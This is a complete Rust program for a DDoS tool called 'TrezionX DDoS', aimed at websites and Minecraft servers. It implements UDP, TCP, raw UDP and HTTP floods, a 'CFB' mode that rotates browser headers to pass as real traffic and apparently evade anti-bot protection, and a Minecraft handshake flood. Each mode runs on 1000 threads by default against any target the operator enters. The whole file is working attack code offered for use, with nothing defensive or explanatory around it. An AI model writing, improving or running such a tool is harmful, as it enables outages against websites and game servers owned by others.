use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};
use std::io::{self, Write};
use std::net::{TcpStream, UdpSocket, ToSocketAddrs};
use std::thread;
use reqwest::blocking::{Client};
use rand::Rng;
use rand::seq::SliceRandom;
use colored::*;
use socket2::{Socket, Domain, Type, Protocol};

struct AttackStats {
    sent: AtomicU64,
    success: AtomicU64,
    failed: AtomicU64,
}


const MAIN_COLOR: Color = Color::BrightWhite;      // яркий белый
const BORDER_COLOR: Color = Color::BrightBlack;    // линии - темно-серые

const BANNER_FULL: &str = r#"
⠀                                                                                                    
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%:     %@=.:#:       :+@@@@@@@@@@@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@@@@@@@@@@@@@@@#         *@.  =@            +@@@@@@@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@@@@@@@@@@@@=+            +@@@*               *@@@@@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@@@@@@@@@%.                     :              -%@@@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@@@@@@@@. =.                                     +@@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@@@@@%* =+-.-+:        +  --    :    .+    -.     +@@@@@@@@@@@@@@@@      
@@@@@@@@@@@@@+     -:..--@%+*@. . *@@@@@+%@#+          %=  :.-  -@@@@@@@@@@@@@@      
@@@@@@@@@@@@.        .= %@@@%: - .%@@@@@@@@@#    .=+.  @@+:-=.    =@@@@@@@@@@@@      
@@@@@@@@@@@.           *@@***:=+  -+  .#@ *#= ==*@*+-**+@*-:+:.     *@@@@@@@@@@      
@@@@@@@@@@#            =. :*- :               .#*-:.=*= :- :         +@@@@@@@@@      
@@@@@@@@@@-           ..  .     .=++#+**+**=.        +   .            %@@@@@@@@      
@@@@@@@@@%.     .     ::       *#*#%@@@@@@*+*+:            .          *@@@@@@@@      
@@@@@@@@@%      .             :+@@@@@@@@@@%=-+=                  .+   +@@@@@@@@      
@@@@@@@@@@.   =-              -#@@@%#@@@@@@**#=                 :=.   =@@@@@@@@      
@@@@@@@@@#   .%-.                 :#@@@@@@@#-                   .+    *@@@@@@@@      
@@@@@@@@@+   *#:-                 -@@@@@@%@@#.                  :#   +@@@@@@@@@      
@@@@@@@@@:                      :+%@@@@@@@@@@+.                 =-   -@@@@@@@@@      
@@@@@@@@@:    : :    #+     -%@@@@@@@@@@@@@@@@@%*:              -.   %@@@@@@@@@      
@@@@@@@@@-   .==#    %@@.    #@@@@@@@@@+-=*##++**                    %@@@@@@@@@      
@@@@@@@@@:    =*#    %@@@+   :@@@@@@@@#- :#@%*-         -.     .=    %@@@@@@@@@    Welcome to TrezionX DDoS
@@@@@@@@%.    .     .@@@@@% .*-*@@@@@@@+ .+...      =: @@-     .+    +@@@@@@@@@    This DDoS tool is for a website
@@@@@@@@@.    +*=    %@@@@@@*:@@%%@@@@@=       - =%@++@@@#      .-   .@@@@@@@@@    or a Minecraft server
@@@@@@@@@-   -*@+    @@@@@@@@@@@@@* -*+*.     =@@@@%@@@@@@+     +%    +@@@@@@@@      
@@@@@@@@@=    %@*    %@@@@@@@@@@@@%           *@@@@@@@@@@@@+   .+#.   -@@@@@@@@      
@@@@@@@@@+    :=:    #@@@@@@@@@@@@=      .@.: *@@@@@@@@@@@@#     +-   :@@@@@@@@      
@@@@@@@@@*    :#@-   #@@@@@@@@@@++#@@+@@@@#@@%-%@@@@@@@@@@@*          =@@@@@@@@      
@@@@@@@@@@    .##-   =@@@@@%+*@@@@@@@@@@@@@@@@@@#:*@@@@@@@@#       =  .@@@@@@@@      
@@@@@@@@@@:   =@%.  -%#-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=+#@@@     -+#   =@@@@@@@      
@@@@@@@@@@+      =*%@@@#+=*%%%@@@@@@@@@@@@@@@@@@@@@@%=.#@@+.:      -   *@@@@@@@      
@@@@@@@@@@@    .%@@@@@@#@@@@@@%%%=..+%@@@@+=---=+##@@@@@@@@@@@@@#.     .@@@@@@@      
@@@@@@@@@@@*    *@@@@@@@@@%**##@@@@@@@@@@#@@@@%#*#****++@@@@@@@@@@:     #@@@@@@      
@@@@@@@@@@@@.   +@@@@@@@@@@@@@@@@@@@@@@@**@@@@@@@@@@@@@@@@@*@@@@@@=     +@@@@@@      
@@@@@@@@@@@@*    %@@@@@=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=-%@@@@+       @@@@@@      
@@@@@@@@@@@@@    .*##@#-*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#+--+**:        -@@@@@@               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"#;

const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
];

const REFERERS: &[&str] = &[
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "",
];

const ACCEPTS: &[&str] = &[
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
];

fn print_border() {
    println!("{}", "═".repeat(70).color(BORDER_COLOR));
}

fn resolve_host(host: &str) -> Option<String> {
    let host = host.replace("https://", "").replace("http://", "").replace("/", "");
    if let Ok(addr) = host.parse::<std::net::IpAddr>() {
        return Some(addr.to_string());
    }
    let addr = format!("{}:80", host).to_socket_addrs().ok()?.next()?;
    Some(addr.ip().to_string())
}

fn udp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    let data = vec![0x41u8; 1472];
    
    loop {
        for _ in 0..100 {
            if socket.send_to(&data, &addr).is_ok() {
                stats.sent.fetch_add(1, Ordering::Relaxed);
                stats.success.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.failed.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

fn tcp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let data = vec![0u8; 65535];
    
    loop {
        if let Ok(mut stream) = TcpStream::connect(&addr) {
            stream.set_nodelay(true).unwrap();
            let _ = stream.write(&data);
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn raw_udp_flood(target: String, port: u16, stats: Arc<AttackStats>) {
    let socket = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP)).unwrap();
    let addr: std::net::SocketAddr = format!("{}:{}", target, port).parse().unwrap();
    let data = vec![0x41u8; 1472];
    
    loop {
        for _ in 0..100 {
            if socket.send_to(&data, &addr.into()).is_ok() {
                stats.sent.fetch_add(1, Ordering::Relaxed);
                stats.success.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.failed.fetch_add(1, Ordering::Relaxed);
            }
        }
    }
}

fn http_flood(url: String, stats: Arc<AttackStats>) {
    let client = Client::builder()
        .tcp_nodelay(true)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    
    loop {
        let target = format!("{}?cb={}", url, rand::thread_rng().gen::<u64>());
        if client.get(&target).send().is_ok() {
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn cfb_flood(url: String, stats: Arc<AttackStats>) {
    let client = Client::builder()
        .tcp_nodelay(true)
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    
    loop {
        let target = format!("{}?cb={}", url, rand::thread_rng().gen::<u64>());
        
        let ua = USER_AGENTS.choose(&mut rand::thread_rng()).unwrap();
        let referer = REFERERS.choose(&mut rand::thread_rng()).unwrap();
        let accept = ACCEPTS.choose(&mut rand::thread_rng()).unwrap();
        
        let mut request = client.get(&target)
            .header("User-Agent", *ua)
            .header("Accept", *accept)
            .header("Accept-Encoding", "gzip, deflate, br")
            .header("Cache-Control", "no-cache")
            .header("Sec-Ch-Ua", "\"Chromium\";v=\"124\"")
            .header("Sec-Fetch-Dest", "document")
            .header("Sec-Fetch-Mode", "navigate")
            .header("Sec-Fetch-Site", if referer.is_empty() { "none" } else { "cross-site" });
        
        if !referer.is_empty() {
            request = request.header("Referer", *referer);
        }
        
        if request.send().is_ok() {
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn minecraft_crash(target: String, port: u16, stats: Arc<AttackStats>) {
    let addr = format!("{}:{}", target, port);
    let handshake = hex::decode("0fe0040ed3026d632e736861646f772e6e657463dd01").unwrap_or_default();
    let request = vec![0x01, 0x00];
    
    loop {
        if let Ok(mut stream) = TcpStream::connect(&addr) {
            stream.set_nodelay(true).unwrap();
            let _ = stream.write(&handshake);
            let _ = stream.write(&request);
            stats.sent.fetch_add(1, Ordering::Relaxed);
            stats.success.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.failed.fetch_add(1, Ordering::Relaxed);
        }
    }
}

fn stats_monitor(stats: Arc<AttackStats>) {
    let start = Instant::now();
    let mut last_sent = 0;
    
    loop {
        thread::sleep(Duration::from_millis(1500));
        let sent = stats.sent.load(Ordering::Relaxed);
        let success = stats.success.load(Ordering::Relaxed);
        let failed = stats.failed.load(Ordering::Relaxed);
        let diff = sent - last_sent;
        let elapsed = start.elapsed().as_secs().max(1);
        let gbps = (sent as f64 * 1300.0 * 8.0) / 1_000_000_000.0 / elapsed as f64;
        
        print!("\r[STATS] Sent: {} | Success: {} | Failed: {} | RPS: {} | Gbps: {:.2} | Time: {}s", 
            sent, success, failed, diff, gbps, elapsed);
        io::stdout().flush().unwrap();
        last_sent = sent;
    }
}

fn main() {
    print!("{}[2J", 27 as char);
    println!("{}", BANNER_FULL.color(MAIN_COLOR));
    println!("{}", "TrezionX DDoS".color(MAIN_COLOR).bold());
    
    let stats = Arc::new(AttackStats { 
        sent: AtomicU64::new(0), 
        success: AtomicU64::new(0), 
        failed: AtomicU64::new(0),
    });
    let mut attack_handles: Vec<thread::JoinHandle<()>> = vec![];
    
    print_border();
    println!("{}", "TARGET SETUP".color(MAIN_COLOR).bold());
    print_border();
    
    print!("{}", "▶ Enter target (IP/URL): ".color(MAIN_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut target = String::new();
    io::stdin().read_line(&mut target).unwrap();
    let target = target.trim().to_string();
    
    let target_ip = if let Some(ip) = resolve_host(&target) {
        println!("{}", format!("Resolved to: {}", ip).color(MAIN_COLOR));
        ip
    } else {
        println!("{}", "! Failed to resolve, using as-is".color(MAIN_COLOR));
        target.replace("https://", "").replace("http://", "").replace("/", "")
    };
    
    println!();
    println!("{}", "Available methods:".color(MAIN_COLOR));
    println!("{}", "  L4: UDP, TCP, MIXED, RAW_UDP".color(MAIN_COLOR));
    println!("{}", "  L7: HTTP, CFB".color(MAIN_COLOR));
    println!("{}", "  GAME: MINECRAFT".color(MAIN_COLOR));
    print!("{}", "▶ Enter method: ".color(MAIN_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut method = String::new();
    io::stdin().read_line(&mut method).unwrap();
    let method = method.trim().to_uppercase();
    
    let default_port = match method.as_str() {
        "MINECRAFT" => 25565,
        "CFB" | "HTTP" => 443,
        _ => 80,
    };
    print!("{}", format!("▶ Enter port (default: {}): ", default_port).color(MAIN_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut port_str = String::new();
    io::stdin().read_line(&mut port_str).unwrap();
    let port: u16 = port_str.trim().parse().unwrap_or(default_port);
    
    let default_threads = 1000;
    print!("{}", format!("▶ Enter threads (default: {}): ", default_threads).color(MAIN_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut threads_str = String::new();
    io::stdin().read_line(&mut threads_str).unwrap();
    let threads = threads_str.trim().parse().unwrap_or(default_threads);
    
    println!("{}", format!("Threads set to: {}", threads).color(MAIN_COLOR));
    
    println!();
    print_border();
    println!("{}", "ATTACK CONFIGURATION".color(MAIN_COLOR).bold());
    print_border();
    println!("{}", format!("▶ Target: {}", target_ip).color(MAIN_COLOR));
    println!("{}", format!("▶ Method: {}", method).color(MAIN_COLOR));
    println!("{}", format!("▶ Port: {}", port).color(MAIN_COLOR));
    println!("{}", format!("▶ Threads: {}", threads).color(MAIN_COLOR));
    print_border();
    
    print!("{}", "Start attack? (y/N): ".color(MAIN_COLOR).bold());
    io::stdout().flush().unwrap();
    let mut confirm = String::new();
    io::stdin().read_line(&mut confirm).unwrap();
    
    if !confirm.trim().to_lowercase().starts_with('y') {
        println!("{}", "Attack cancelled.".color(MAIN_COLOR));
        return;
    }
    
    println!();
    print_border();
    println!("{}", "▶ STARTING ATTACK".color(MAIN_COLOR).bold());
    print_border();
    println!("{}", format!("▶ Target: {}:{}", target_ip, port).color(MAIN_COLOR));
    println!("{}", format!("▶ Method: {}", method).color(MAIN_COLOR));
    println!("{}", format!("▶ Threads: {}", threads).color(MAIN_COLOR));
    print_border();
    println!();
    
    let stats_clone = stats.clone();
    thread::spawn(move || stats_monitor(stats_clone));
    
    match method.as_str() {
        "UDP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || udp_flood(t, port, s)));
            }
        }
        "TCP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || tcp_flood(t, port, s)));
            }
        }
        "MIXED" => {
            for _ in 0..threads/2 {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || udp_flood(t.clone(), port, s.clone())));
            }
            for _ in 0..threads/2 {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || tcp_flood(t, port, s)));
            }
        }
        "RAW_UDP" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || raw_udp_flood(t, port, s)));
            }
        }
        "HTTP" => {
            let url = if target.starts_with("http") { target.clone() } else { format!("https://{}", target) };
            for _ in 0..threads {
                let u = url.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || http_flood(u, s)));
            }
        }
        "CFB" => {
            let url = if target.starts_with("http") { target.clone() } else { format!("https://{}", target) };
            for _ in 0..threads {
                let u = url.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || cfb_flood(u, s)));
            }
        }
        "MINECRAFT" => {
            for _ in 0..threads {
                let t = target_ip.clone();
                let s = stats.clone();
                attack_handles.push(thread::spawn(move || minecraft_crash(t, port, s)));
            }
        }
        _ => {
            println!("{}", "Unknown method!".color(MAIN_COLOR));
            return;
        }
    }
    
    println!("\n Press ENTER to stop attack...");
    let mut stop = String::new();
    io::stdin().read_line(&mut stop).unwrap();
    
    std::process::exit(0);
}
